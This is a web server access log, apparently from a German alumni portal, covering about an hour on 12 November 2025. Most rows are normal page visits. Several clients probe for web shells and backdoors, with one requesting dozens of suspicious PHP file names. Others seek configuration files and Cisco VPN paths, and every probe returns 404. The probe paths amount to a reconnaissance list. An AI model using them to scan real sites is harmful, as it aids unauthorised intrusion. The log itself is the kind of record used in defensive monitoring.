user;timestamp;referer;target;method;status
a1111769dffcc4ca3efd52278d3f1445fef2461e586dae2aed7a4c4d7fa95ce6;2025-11-12 11:25:37;;/okxoby.php;GET;404
a1111769dffcc4ca3efd52278d3f1445fef2461e586dae2aed7a4c4d7fa95ce6;2025-11-12 11:25:38;;/error1.php;GET;404
a1111769dffcc4ca3efd52278d3f1445fef2461e586dae2aed7a4c4d7fa95ce6;2025-11-12 11:25:39;;/xtt.php;GET;404
a1111769dffcc4ca3efd52278d3f1445fef2461e586dae2aed7a4c4d7fa95ce6;2025-11-12 11:25:43;;/autoload_classmap.php;GET;404
a1111769dffcc4ca3efd52278d3f1445fef2461e586dae2aed7a4c4d7fa95ce6;2025-11-12 11:25:44;;/wcas.php;GET;404
2f171aebb9ec8fab84ffc23d9189d698cca5b00c8a00576827d6f4acac5a8909;2025-11-12 11:28:04;;/gruppen/hobby/tanzen;GET;302
2f171aebb9ec8fab84ffc23d9189d698cca5b00c8a00576827d6f4acac5a8909;2025-11-12 11:28:08;/gruppen/hobby/tanzen;/gruppen;GET;200
ee93ed4ca46b5f3909d5319380f28ed9bd0a111f40eb3e60e861d0ef16a41d73;2025-11-12 11:28:27;;/captcha2.php?captcha=inf2024;GET;404
9b7086b19e3383668f6cc3d6359c8aa843fa203412cbac8af0287b225954ef16;2025-11-12 11:32:49;;/;GET;200
4a5606c5b3a9ea59460a6ad94a14b2ddc6ed1d42abfb5d084c5f020d519bc2a4;2025-11-12 11:37:45;;/.config;GET;404
4a5606c5b3a9ea59460a6ad94a14b2ddc6ed1d42abfb5d084c5f020d519bc2a4;2025-11-12 11:37:45;;/config;GET;404
94e382f58c667dffbd6abb636ec39f0b8d752af5370a563a6b988faa40c45aba;2025-11-12 11:39:48;;/personen;GET;200
d0be8bb7fd0be6aab6961e33f9c0abdac67db68697bff4dda37e33941f51e588;2025-11-12 11:41:38;;/personen/alumni/schule/03A04;GET;200
71f331bda3ff5a1b1880b5ed375ee4aaa4463d7945558b9cb3608207a62c0b22;2025-11-12 11:49:08;;/personen/alumni/schule/07A05;GET;200
3d26b1ba38a2b067d2d9cdb27e80b45e14a75bdb972c7e2a4a340184077f948f;2025-11-12 11:51:41;;/aktuelles/meldungen/details/alumni-portal-des-zbw-geht-an-den-start;GET;200
e51b3fc9c4c87067012b5eab88349bf1b58f1ba1ccd61ccb8b0ba061d6015ee7;2025-11-12 11:52:36;;/themen?category=kultur;GET;200
c6f815cf1e24e7ddcf8d6056d055713d865fe1a6293f635144731c9dfc09f9e5;2025-11-12 11:53:56;/personen/all/4;/personen/alumni/details/olaf-schaeffer;GET;200
942a1df54a0678721140eb67e150cf3574524549decdfdf7f3766c193f437216;2025-11-12 11:56:51;;/.well-known/traffic-advice;GET;404
d9baa08bce40e7d263ee9d29a469a268e45a4a41fbc5878bcf7e946b263e8fd3;2025-11-12 11:56:51;/;/personen/alumni/schule/170720;GET;200
69250c185eeb45405bf3c9785fe5ea4812bee9fe5f4264430ec363dcb1cf9ed4;2025-11-12 12:00:29;;/personen/alumni/schule/600027;GET;200
2811fbae51e0fe40fea8f2d639a03332ac315f817d2a292df6011e0edcd62736;2025-11-12 12:01:23;;/aktuelles/stellenangebote;GET;200
4a5606c5b3a9ea59460a6ad94a14b2ddc6ed1d42abfb5d084c5f020d519bc2a4;2025-11-12 12:02:19;;/config;GET;404
4a5606c5b3a9ea59460a6ad94a14b2ddc6ed1d42abfb5d084c5f020d519bc2a4;2025-11-12 12:02:19;;/.config;GET;404
9d18d06a85c4be0718cbb82c5bae70e3decf602ad4032fa3fc48d45e5157166b;2025-11-12 12:02:25;;/+CSCOL+/Java.jar;GET;404
9d18d06a85c4be0718cbb82c5bae70e3decf602ad4032fa3fc48d45e5157166b;2025-11-12 12:02:25;;/+CSCOE+/logon_forms.js;GET;404
9d18d06a85c4be0718cbb82c5bae70e3decf602ad4032fa3fc48d45e5157166b;2025-11-12 12:02:26;;/+CSCOL+/a1.jar;GET;404
9d18d06a85c4be0718cbb82c5bae70e3decf602ad4032fa3fc48d45e5157166b;2025-11-12 12:02:26;;/+CSCOE+/transfer.js;GET;404
153e34497b5d8e65da9577755a57cc045534c18e8e387af1df970be4bc9bc7dd;2025-11-12 12:08:47;;/aktuelles/meldungen/details/hackerangriff-lauft-ins-leere;GET;200
12dc3e5f1e4d87973b7ff0f1de7a9896a51019936423ccffda343a8668eeb79c;2025-11-12 12:12:43;;/;GET;200
c04b0454831a3893c910575b64f2e06041d57b70e79e0f26faf97993aa5c41fa;2025-11-12 12:14:39;;/personen/alumni/schule/5507;GET;200
c3b92ba921dcfc41847dd00483fa3879137e3c4b820db7f40a3f78624cf1da8f;2025-11-12 12:17:14;/themen/details/was-kommt-nach-dem-abitur;/themen/details/was-kommt-nach-dem-abitur;GET;200
1f4b8a78a3cc025cfbbbe4b60b5eaa263dec53a96149eadb88d20057575a6689;2025-11-12 12:17:16;/;/;GET;200
540060ff0c27ecd033087cbeb4edb9eb48e2adc5db5713c493ff03d0613e6218;2025-11-12 12:21:12;;/aktuelles/meldungen/details/start-der-open-beta-jetzt-anmelden-und-testen;GET;200
8710226a8e1aad35fe2fb671859ecd878de32503cebcdd5ad62d75b1be6006b0;2025-11-12 12:29:56;;/personen/alumni/schule/9004;GET;200
b65004e96ff6287bb40899d94d558d9f6a7b9d699b80b912513a3b7448d2c695;2025-11-12 12:31:06;;/personen/alumni/details/sami-teuchert;GET;200
290191761fbf22c895dd9414a066fc80ff47751f0a3280001ae278ab18ef99aa;2025-11-12 12:31:39;;/themen/details/der-start-ins-studium;GET;200
c1dbcfe1961f7de120b0eaf2fca6a23fbf720046cbb2f4a7b76b5674488c736a;2025-11-12 12:32:28;;/personen/alumni/schule/5506;GET;200
0fe4f93a94f9a81effa170232096a2f980f135bf49e6165e2ed6c1e7d9a2ded1;2025-11-12 12:33:00;;/;GET;200
37fa8f11e970bb2599fec1fc07f72e102ef67b73d593ca50b15d65da6190a3ec;2025-11-12 12:36:48;;/wp-content/plugins/hellopress/wp_filemanager.php;GET;404
37fa8f11e970bb2599fec1fc07f72e102ef67b73d593ca50b15d65da6190a3ec;2025-11-12 12:36:49;;/error.php;GET;404
37fa8f11e970bb2599fec1fc07f72e102ef67b73d593ca50b15d65da6190a3ec;2025-11-12 12:36:50;;/x.php;GET;404
37fa8f11e970bb2599fec1fc07f72e102ef67b73d593ca50b15d65da6190a3ec;2025-11-12 12:36:51;;/xx.php;GET;404
37fa8f11e970bb2599fec1fc07f72e102ef67b73d593ca50b15d65da6190a3ec;2025-11-12 12:36:52;;/222.php;GET;404
37fa8f11e970bb2599fec1fc07f72e102ef67b73d593ca50b15d65da6190a3ec;2025-11-12 12:36:53;;/444.php;GET;404
37fa8f11e970bb2599fec1fc07f72e102ef67b73d593ca50b15d65da6190a3ec;2025-11-12 12:36:54;;/file9.php;GET;404
37fa8f11e970bb2599fec1fc07f72e102ef67b73d593ca50b15d65da6190a3ec;2025-11-12 12:36:54;;/filesss.php;GET;404
37fa8f11e970bb2599fec1fc07f72e102ef67b73d593ca50b15d65da6190a3ec;2025-11-12 12:36:55;;/file88.php;GET;404
37fa8f11e970bb2599fec1fc07f72e102ef67b73d593ca50b15d65da6190a3ec;2025-11-12 12:36:56;;/gifclass4.php;GET;404
37fa8f11e970bb2599fec1fc07f72e102ef67b73d593ca50b15d65da6190a3ec;2025-11-12 12:36:57;;/class19.php;GET;404
37fa8f11e970bb2599fec1fc07f72e102ef67b73d593ca50b15d65da6190a3ec;2025-11-12 12:36:58;;/2clas.php;GET;404
37fa8f11e970bb2599fec1fc07f72e102ef67b73d593ca50b15d65da6190a3ec;2025-11-12 12:36:59;;/bless5.php;GET;404
37fa8f11e970bb2599fec1fc07f72e102ef67b73d593ca50b15d65da6190a3ec;2025-11-12 12:36:59;;/file15.php;GET;404
37fa8f11e970bb2599fec1fc07f72e102ef67b73d593ca50b15d65da6190a3ec;2025-11-12 12:37:00;;/333.php;GET;404
37fa8f11e970bb2599fec1fc07f72e102ef67b73d593ca50b15d65da6190a3ec;2025-11-12 12:37:01;;/alpa.php;GET;404
37fa8f11e970bb2599fec1fc07f72e102ef67b73d593ca50b15d65da6190a3ec;2025-11-12 12:37:02;;/file21.php;GET;404
37fa8f11e970bb2599fec1fc07f72e102ef67b73d593ca50b15d65da6190a3ec;2025-11-12 12:37:03;;/ut.php;GET;404
37fa8f11e970bb2599fec1fc07f72e102ef67b73d593ca50b15d65da6190a3ec;2025-11-12 12:37:04;;/inde.php;GET;404
37fa8f11e970bb2599fec1fc07f72e102ef67b73d593ca50b15d65da6190a3ec;2025-11-12 12:37:04;;/classgoto24.php;GET;404
37fa8f11e970bb2599fec1fc07f72e102ef67b73d593ca50b15d65da6190a3ec;2025-11-12 12:37:05;;/thh.php;GET;404
37fa8f11e970bb2599fec1fc07f72e102ef67b73d593ca50b15d65da6190a3ec;2025-11-12 12:37:06;;/fffff.php;GET;404
37fa8f11e970bb2599fec1fc07f72e102ef67b73d593ca50b15d65da6190a3ec;2025-11-12 12:37:07;;/indo.php;GET;404
37fa8f11e970bb2599fec1fc07f72e102ef67b73d593ca50b15d65da6190a3ec;2025-11-12 12:37:07;;/fileas.php;GET;404
37fa8f11e970bb2599fec1fc07f72e102ef67b73d593ca50b15d65da6190a3ec;2025-11-12 12:37:08;;/yellow.php;GET;404
37fa8f11e970bb2599fec1fc07f72e102ef67b73d593ca50b15d65da6190a3ec;2025-11-12 12:37:09;;/wfile.php;GET;404
37fa8f11e970bb2599fec1fc07f72e102ef67b73d593ca50b15d65da6190a3ec;2025-11-12 12:37:10;;/class20.php;GET;404
37fa8f11e970bb2599fec1fc07f72e102ef67b73d593ca50b15d65da6190a3ec;2025-11-12 12:37:11;;/build.php;GET;404
37fa8f11e970bb2599fec1fc07f72e102ef67b73d593ca50b15d65da6190a3ec;2025-11-12 12:37:11;;/1.php;GET;404
37fa8f11e970bb2599fec1fc07f72e102ef67b73d593ca50b15d65da6190a3ec;2025-11-12 12:37:12;;/usep.php;GET;404
37fa8f11e970bb2599fec1fc07f72e102ef67b73d593ca50b15d65da6190a3ec;2025-11-12 12:37:13;;/wa.php;GET;404
37fa8f11e970bb2599fec1fc07f72e102ef67b73d593ca50b15d65da6190a3ec;2025-11-12 12:37:14;;/wb.php;GET;404
37fa8f11e970bb2599fec1fc07f72e102ef67b73d593ca50b15d65da6190a3ec;2025-11-12 12:37:15;;/file1.php;GET;404
37fa8f11e970bb2599fec1fc07f72e102ef67b73d593ca50b15d65da6190a3ec;2025-11-12 12:37:16;;/gmo.php;GET;404
37fa8f11e970bb2599fec1fc07f72e102ef67b73d593ca50b15d65da6190a3ec;2025-11-12 12:37:16;;/info.php;GET;404
37fa8f11e970bb2599fec1fc07f72e102ef67b73d593ca50b15d65da6190a3ec;2025-11-12 12:37:17;;/file2.php;GET;404
37fa8f11e970bb2599fec1fc07f72e102ef67b73d593ca50b15d65da6190a3ec;2025-11-12 12:37:18;;/lv.php;GET;404
37fa8f11e970bb2599fec1fc07f72e102ef67b73d593ca50b15d65da6190a3ec;2025-11-12 12:37:19;;/about.php;GET;404
37fa8f11e970bb2599fec1fc07f72e102ef67b73d593ca50b15d65da6190a3ec;2025-11-12 12:37:20;;/abcd.php;GET;404
37fa8f11e970bb2599fec1fc07f72e102ef67b73d593ca50b15d65da6190a3ec;2025-11-12 12:37:20;;/lock360.php;GET;404
37fa8f11e970bb2599fec1fc07f72e102ef67b73d593ca50b15d65da6190a3ec;2025-11-12 12:37:21;;/pp.php;GET;404
37fa8f11e970bb2599fec1fc07f72e102ef67b73d593ca50b15d65da6190a3ec;2025-11-12 12:37:22;;/geck.php;GET;404
37fa8f11e970bb2599fec1fc07f72e102ef67b73d593ca50b15d65da6190a3ec;2025-11-12 12:37:23;;/gm.php;GET;404
37fa8f11e970bb2599fec1fc07f72e102ef67b73d593ca50b15d65da6190a3ec;2025-11-12 12:37:24;;/file4.php;GET;404
37fa8f11e970bb2599fec1fc07f72e102ef67b73d593ca50b15d65da6190a3ec;2025-11-12 12:37:24;;/520.php;GET;404
37fa8f11e970bb2599fec1fc07f72e102ef67b73d593ca50b15d65da6190a3ec;2025-11-12 12:37:25;;/file18.php;GET;404
37fa8f11e970bb2599fec1fc07f72e102ef67b73d593ca50b15d65da6190a3ec;2025-11-12 12:37:26;;/ffile.php;GET;404
37fa8f11e970bb2599fec1fc07f72e102ef67b73d593ca50b15d65da6190a3ec;2025-11-12 12:37:27;;/file7.php;GET;404
37fa8f11e970bb2599fec1fc07f72e102ef67b73d593ca50b15d65da6190a3ec;2025-11-12 12:37:27;;/aaa.php;GET;404
37fa8f11e970bb2599fec1fc07f72e102ef67b73d593ca50b15d65da6190a3ec;2025-11-12 12:37:28;;/vee.php;GET;404
37fa8f11e970bb2599fec1fc07f72e102ef67b73d593ca50b15d65da6190a3ec;2025-11-12 12:37:29;;/efile.php;GET;404
37fa8f11e970bb2599fec1fc07f72e102ef67b73d593ca50b15d65da6190a3ec;2025-11-12 12:37:30;;/afile.php;GET;404
37fa8f11e970bb2599fec1fc07f72e102ef67b73d593ca50b15d65da6190a3ec;2025-11-12 12:37:31;;/f35.php;GET;404
37fa8f11e970bb2599fec1fc07f72e102ef67b73d593ca50b15d65da6190a3ec;2025-11-12 12:37:32;;/goods.php;GET;404
37fa8f11e970bb2599fec1fc07f72e102ef67b73d593ca50b15d65da6190a3ec;2025-11-12 12:37:33;;/enclas.php;GET;404
37fa8f11e970bb2599fec1fc07f72e102ef67b73d593ca50b15d65da6190a3ec;2025-11-12 12:37:34;;/ioxi-o.php;GET;404
